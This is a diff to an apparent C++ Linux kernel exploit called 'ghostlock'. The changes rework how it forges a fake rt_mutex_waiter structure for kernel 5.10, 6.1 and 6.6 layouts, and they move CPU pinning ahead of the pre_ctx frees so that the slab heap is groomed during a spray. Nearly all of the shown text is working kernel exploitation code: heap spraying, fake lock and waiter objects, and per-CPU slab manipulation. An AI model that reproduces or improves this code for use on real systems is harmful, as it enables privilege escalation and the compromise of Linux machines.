@@ -397,17 +397,10 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                /* BTF-derived rt_mutex_waiter.prio offset (64 on 5.10, 68 on
-                 * 6.1); absent means the 6.1 layout. On 5.10 the waiter has
-                 * no wake_state/ww_ctx, so prio lands at +0x40 and nothing is
-                 * written past the 80-byte struct. */
-                (void) memory::encode_compact_waiter_tail(
-                    {
-                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
-                        memory::kCompactWaiterTailBytes
-                    },
-                    v ? v->misc.waiter_prio.value_or(0x44) : 0x44,
-                    kernel::FAKE_WAITER_PRIO);
+                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
+                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
                 /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                 put64(p, kernel::W0_OFF + 0x00, 1);
@@ -484,18 +477,6 @@ namespace ghostlock::support {
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
-        /* Pin the main thread to main_cpu BEFORE the first clone: the
-         * target slab is frozen by the first pre free onto the per-CPU
-         * partial list of whatever CPU the free runs on, and the
-         * prepare_ctx drain below only touches this CPU's list. Pinning
-         * here (instead of just before the frees) gives the migration the
-         * whole clone/leak/collision phase to complete, so the freeze CPU
-         * and the drain CPU are provably the same. */
-        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
-        sched_yield();
-        sched_yield();
-        sched_yield();
-        sched_yield();
         /* Release every userspace reference from the preceding write before the
          * context arrays are replaced. Keeping the final post-spray memfd pinned
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
@@ -668,8 +649,11 @@ namespace ghostlock::support {
 
         SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-        pr_info("[spray] freeing pre_ctx on cpu=%d +%lldms\n",
-                sched_getcpu(), ms_since(&t_spray));
+        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
+        sched_yield();
+        sched_yield();
+        sched_yield();
+        sched_yield();
         for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
             SYSCHK(close(pre_ctx.memfds[i]));
             pre_ctx.memfds[i] = -1;
